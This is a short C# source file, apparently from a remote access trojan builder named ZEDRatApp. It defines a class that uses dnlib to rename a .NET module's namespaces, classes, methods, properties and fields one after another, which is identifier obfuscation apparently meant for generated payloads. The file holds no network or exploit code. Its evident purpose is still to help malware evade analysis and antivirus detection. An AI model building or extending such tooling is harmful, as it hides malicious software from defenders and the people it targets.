using dnlib.DotNet;
using ZEDRatApp.Forms.RenamingObfuscation.Classes;
using ZEDRatApp.Forms.RenamingObfuscation.Interfaces;

namespace ZEDRatApp.Forms.RenamingObfuscation
{
	public class Renaming
	{
		public static ModuleDefMD DoRenaming(ModuleDefMD inPath)
		{
			return Renaming.RenamingObfuscation(inPath);
		}

		private static ModuleDefMD RenamingObfuscation(ModuleDefMD inModule)
		{
			ModuleDefMD module = ((IRenaming)new NamespacesRenaming()).Rename(inModule);
			ModuleDefMD module2 = ((IRenaming)new ClassesRenaming()).Rename(module);
			ModuleDefMD module3 = ((IRenaming)new MethodsRenaming()).Rename(module2);
			ModuleDefMD module4 = ((IRenaming)new PropertiesRenaming()).Rename(module3);
			return ((IRenaming)new FieldsRenaming()).Rename(module4);
		}
	}
}
